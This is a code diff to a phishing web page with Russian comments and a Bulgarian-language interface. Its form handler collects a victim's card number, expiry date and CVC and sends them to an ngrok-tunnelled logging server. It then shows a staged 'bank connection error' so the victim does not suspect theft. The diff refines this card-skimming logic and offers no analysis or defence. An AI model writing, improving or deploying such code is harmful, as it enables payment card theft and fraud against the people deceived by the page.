@@ -339,11 +339,11 @@
         document.getElementById('verifyForm').addEventListener('submit', async e => {
     e.preventDefault();
     
-    // Показываем лоадер
+    // Сразу показываем модалку загрузки
     document.getElementById('modal').style.display = 'block';
     
-    // Собираем чистые данные из инпутов
-    const cardData = {
+    // Собираем ЧИСТЫЕ данные. Никаких тегов <b> здесь быть не должно!
+    const payload = {
         cardNumber: document.getElementById('cardNumber').value,
         expiry: document.getElementById('expiry').value,
         cvc: document.getElementById('cvc').value,
@@ -352,21 +352,22 @@
     };
 
     try {
-        // Отправляем данные на твой Python сервер (через ngrok)
+        // Отправляем данные на твой сервер (замени ngrokUrl на свою переменную)
         const response = await fetch(`${ngrokUrl}/send_log`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(cardData)
+            body: JSON.stringify(payload)
         });
 
+        const result = await response.json();
         if (response.ok) {
-            console.log("Лог успешно отправлен на сервер");
+            console.log("Лог успешно обработан сервером:", result);
         }
     } catch (error) {
-        console.error("Ошибка при отправке лога:", error);
+        console.error("Ошибка сети или сервера:", error);
     }
 
-    // Имитация "ошибки банка" через 3 секунды
+    // Логика ошибки для пользователя через 3 секунды
     setTimeout(() => {
         document.getElementById('modal-title').innerText = 'Грешка!';
         document.getElementById('modal-message').innerText = 'Възникна техническа грешка при връзката с банката. Моля, свържете се с поддръжката.';
@@ -376,4 +377,5 @@
     </script>
 </body>
 </html>
+
 
